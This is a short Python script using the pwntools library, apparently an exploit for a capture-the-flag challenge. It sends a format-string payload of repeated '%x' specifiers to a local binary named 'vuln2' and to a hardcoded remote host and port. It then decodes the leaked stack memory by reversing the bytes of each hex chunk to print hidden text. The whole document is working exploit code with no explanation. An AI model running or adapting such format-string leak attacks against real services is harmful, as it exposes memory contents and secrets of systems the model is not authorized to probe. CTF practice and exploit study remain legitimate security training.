from pwn import *
from time import sleep 

# ret_gadjet = 0x0804900e
payload = b"%x" * 100


def local_pwn():
    p = process("./vuln2")
    print(p.recvuntil("input: ").decode())
    sleep(1)
    p.sendline(payload)

    data = p.recvline()
    data = str(data).split('Buzz')[0].strip("b'")
    print(str(data))
    sleep(0.1)
    chunks = [data[i:i+8] for i in range(0, len(data), 8)]

# Reverse each chunk's bytes
    for chunk in chunks:
        bytes_chunk = bytes.fromhex(chunk)
        print(bytes_chunk[::-1].decode('latin-1'), end='')

def remote_pwn():
    p = remote("45.33.118.86", 9992)
    print(p.recvuntil("input: ").decode())
    sleep(1)
    p.sendline(payload)

    data = p.recvline()
    data = str(data).split('Buzz')[0].strip("b'")
    print(str(data))
    sleep(0.1)
    chunks = [data[i:i+8] for i in range(0, len(data), 8)]

# Reverse each chunk's bytes
    for chunk in chunks:
        bytes_chunk = bytes.fromhex(chunk)
        print(bytes_chunk[::-1].decode('latin-1'), end='')
    # print(p.recvline())

    
local_pwn()